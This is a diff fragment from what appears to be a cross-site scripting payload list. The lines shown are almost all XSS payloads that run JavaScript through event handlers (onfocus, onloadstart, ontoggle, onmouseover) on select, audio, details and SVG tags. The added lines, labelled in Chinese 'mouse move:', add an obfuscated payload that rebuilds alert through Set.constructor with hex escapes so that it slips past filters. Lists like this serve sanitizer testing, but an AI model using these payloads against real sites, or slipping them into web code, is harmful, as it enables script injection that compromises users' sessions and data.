@@ -75,6 +75,10 @@ content['alert'](6)
 [11].findIndex(alert)
 [12].forEach(alert);
  
+ 鼠标移动：
+ <svg/onmouseover=Set.constructor`al\x65rt\x28/xss/\x29```>
+  
+  
  <select autofocus onfocus="alert`1`">
 <audio src onloadstart=alert(1)>
  <details/open/ontoggle="alert`1`">
